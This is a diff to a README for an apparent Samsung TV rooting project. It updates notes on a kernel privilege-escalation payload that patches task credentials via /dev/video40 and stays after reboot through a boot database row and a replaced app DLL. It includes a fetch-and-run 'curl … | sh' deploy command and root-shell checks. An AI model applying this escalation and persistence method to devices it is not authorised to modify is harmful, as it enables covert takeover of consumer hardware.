@@ -35,8 +35,8 @@ channel on TCP 31337 (line protocol, replies end with `__END__`).
 
 | | |
 |---|---|
-| Payload | **v32 on the TV and in the repo** (`a4ccba98…`, 30,208 B), deployed 2026-10-25 |
-| Boot-to-root | **Fifth pass closed: attempt 2 is the floor; v32 cold-boot check passed.** v32 cold boot 2026-10-25 18:25: attempt 1 failed as predicted (`parent=e37fb980` high, `cred=ffffffff`; round 3's child cred high → `cred-scan skip`), fast-exit t=55; **attempt 2 rooted at t=59** (`self=d9356780`, `cred=c5b78080`, both low). The v31 132 s regression is gone. The v31 cold boot had proved attempt 1 is an **allocation lottery**, not timing: attempts 1–3 failed (high reads), attempt 4 rooted at t=132 s. Whole-log evidence: every coherent task/cred read < `0xE0000000` (78/78 `cuid=5001` creds low; 21/21 high creds junk; 15/15 `direct-parent+` and 19/19 `self-patch` successes low; 0/81 task pointers high). Marker: `share/root_boot.txt` |
+| Payload | **v33 on the TV and in the repo** (`63dc2652…`, 30,208 B), deployed 2026-10-25 |
+| Boot-to-root | **Fifth pass closed: attempt 2 is the floor; v33 cold boot 39 s.** v33's fast-mode `high-alloc` gate fired on the first cold boot (2026-10-25 18:35): attempt 1 found `parent=e3400b80` high and a garbage low-non-kptr cred, beaconed `high-alloc … fast-exit` at t=32, AUL relaunched at t=36, **attempt 2 rooted t=38–39** — 39 s vs 59 s on v32 (the gate saved ~20 s; the rest is app start, a failed round-0 hunt, and the relaunch gap). The v32 cold boot (18:25) had attempt 1 high, attempt 2 low, rooted t=59. The v31 cold boot had proved attempt 1 is an **allocation lottery**, not timing: attempts 1–3 high, attempt 4 at t=132 s. Whole-log evidence: every coherent task/cred read < `0xE0000000` (78/78 `cuid=5001` creds low; 21/21 high creds junk; 15/15 `direct-parent+` and 19/19 `self-patch` successes low; 0/81 task pointers high). Marker: `share/root_boot.txt` |
 | Root identity | `uid=0`, `CapEff=0x3fffffffff`, running under the app's own SMACK label |
 | Boot hook | a `boot_sequence` row in `/opt/dbspace/user/5001/.appsvc.db` |
 | Device | `/dev/video40`, one RDWR opener; the app runs as uid 5001, gid 44 |
@@ -58,12 +58,14 @@ wake).
 
 The boot sequence is deliberate: the first launch after a cold boot usually cannot read
 task memory coherently. v29 kept the exit-on-purpose design but gave attempt 1 four
-rounds; v32's rounds are `{0,0,5000,5000}` (the v31 10 s last wait was reverted).
+rounds; v33's rounds are `{0,0,5000,5000}` (the v31 10 s last wait was reverted).
 **Attempt 1 is an allocation lottery** — if the first process's task/cred land in
 the unreliable high half (≥ `0xE0000000` for reads), no amount of in-process waiting
-helps; fast-exit and let AUL relaunch, because only a fresh process re-rolls the
-allocation. Four fast attempts are allowed (counter in `/tmp/.dsh_try`, which resets
-at boot), then a long in-process fallback takes over.
+helps; v33's `high-alloc` gate fast-exits as soon as that is seen, and AUL
+relaunches, because only a fresh process re-rolls the allocation. Four fast attempts
+are allowed (counter in `/tmp/.dsh_try`, which resets at boot), then a long
+in-process fallback takes over. The gate is fast-mode only, so long mode cannot
+loop early exits.
 
 ### Physmap window (v24–v27) — the read-staleness fix
 
@@ -253,7 +255,7 @@ TV boot: com.samsung.tv.MultiControl-Service (dotnet-inhouse, app_onboot)
 | `tools/test_stub.py` | live-stub protocol + clamp checks (fresh page load) |
 | `tools/test_all.py` | runs every layer above; `--tv` adds the live stub |
 | `tools/tv_ws_launch.py` | Samsung remote-control WebSocket diagnostic/launcher (refused on this unit) |
-| `payload/Program.cs` | boot payload source (v32; TV on v32) |
+| `payload/Program.cs` | boot payload source (v33; TV on v33) |
 | `payload/BootPayload.csproj` | net6.0 project, assembly `MultiControlService` |
 | `root.ps1` | one-command runner (server + root + deploy + verify) |
 | `uninstall.ps1` | one-command uninstall (restore stock + verify) |
@@ -337,7 +339,7 @@ shell - that corrupts the stream and wastes the page load.
 
 `server/payload.dll` is committed **deliberately** — it is the artifact the TV
 fetches during deploy, and it is byte-identical to the build output
-`payload/out/MultiControlService.dll` (md5 `a4ccba98…`, v32; reproducible — see §9), so the repo runs
+`payload/out/MultiControlService.dll` (md5 `63dc2652…`, v33; reproducible — see §9), so the repo runs
 without a .NET SDK. Rebuild with `dotnet build payload/BootPayload.csproj -c
 Release`, then update the `WANT=`/`SIZE_WANT=` gate in `server/deploy.sh`.
 
@@ -380,7 +382,7 @@ python run_root.py "id" 6               # uid=0(root)
 
 # 4. deploy the boot payload
 python run_root.py "curl -s http://<HOST_IP>/deploy.sh | sh" 45
-#    expect: UID=0, SIZE=30208, MD5=a4ccba98..., COPY=ok, HOST_FILE=..., DEPLOY_DONE
+#    expect: UID=0, SIZE=30208, MD5=63dc2652..., COPY=ok, HOST_FILE=..., DEPLOY_DONE
 #    (deploy.sh now exits 1 on a label/boot-row/AUL failure instead of warning)
 
 # 5. reboot the TV (exit the browser first so it does not restore the page)
@@ -399,9 +401,9 @@ gateway, deploy/uninstall control flow, source↔blob↔page consistency). Then:
 
 - [ ] `root_shell.py "id" <TV_IP>` returns `uid=0(root)`.
 - [ ] `root_shell.py "cat /proc/self/status | grep CapEff" <TV_IP>` → `0000003fffffffff`.
-- [ ] `root_shell.py "md5sum /opt/usr/apps/com.samsung.tv.MultiControl-Service/bin/MultiControlService.dll" <TV_IP>` → `a4ccba98…`
-- [ ] Cold boot with the browser closed → channel back by attempt 2 at ≤ ~55 s (v30 profile). Attempt-1 `SUCCESS` is a bonus; the fifth pass is closed with attempt 2 as the floor.
-- [ ] `kill -9 <app pid>` → channel back in ~15-45 s (attempt 1 may spend its four rounds; attempt 2 then roots), still uid 0.
+- [ ] `root_shell.py "md5sum /opt/usr/apps/com.samsung.tv.MultiControl-Service/bin/MultiControlService.dll" <TV_IP>` → `63dc2652…`
+- [ ] Cold boot with the browser closed → attempt 1 high exits in ~2 s (`high-alloc … fast-exit`), attempt 2 roots; v33 cold boot observed **39 s** (v32: 59 s). Attempt-1 `SUCCESS` is a bonus; attempt 2 is the floor.
+- [ ] `kill -9 <app pid>` → channel back in ~5–45 s (v33's high-alloc gate skips a high attempt quickly; otherwise attempt 2 roots), still uid 0.
 - [ ] `python tools/test_all.py --tv` against a fresh page load (stub protocol
       + clamps). Details per layer: `docs/TESTING.md`.
 
@@ -463,7 +465,8 @@ gateway, deploy/uninstall control flow, source↔blob↔page consistency). Then:
     `< 0xE0000000`; high creds read 0/junk (0/21 ever 5001), and the first
     process after a cold boot always landed high. Only a fresh process re-rolls
     the allocation. Do **not** "fix" attempt 1 with more rounds/waits — v31's
-    10 s last wait booted in 132 s vs v30's 51 s. The fifth pass is closed with
+    10 s last wait booted in 132 s vs v30's 51 s. v33 fast-exits a high
+    allocation in ~2 s (`high-alloc … fast-exit`); the fifth pass is closed with
     attempt 2 as the floor.
 
 ## 9. Rebuilding the payload
@@ -508,11 +511,12 @@ that downloads it) and reboot. Things to preserve when editing `Program.cs`:
   rounds that follow a wait, so early in-window scans cannot spend it before
   the post-window round that can see ours. A pattern at page offset 0-3 is
   skipped without aborting the rest of the page. Beacons: `cred-scan … total=`.
-- **Fast-mode rounds (v29→v32):** `{0, 0, 5000, 5000}` — the v31 10 s last wait
+- **Fast-mode rounds (v29→v33):** `{0, 0, 5000, 5000}` — the v31 10 s last wait
   was reverted after its cold boot regressed (132 s). Attempt 1 is an allocation
-  lottery: high task/cred reads are garbage, so waiting cannot help; only a fresh
-  process re-rolls the address. The fast PHYSRPT scan is 2 tries; keep the
-  fast-exit as the final fallback.
+  lottery: high task/cred reads are garbage, so waiting cannot help; v33's
+  `high-alloc` gate (fast mode only) fast-exits instead of spending the waits.
+  Only a fresh process re-rolls the address. The fast PHYSRPT scan is 2 tries;
+  keep the fast-exit as the final fallback.
 - `ReopenVideo()` after `FindBase` / `TaskOffsets` and **before** `fork()` (sole
   opener). Never close `/dev/video40` while a landmark child still holds it.
 - Latch **every** new `PHYRFORK` not in `pre` (v23): parent-cred uid 5001, 0,
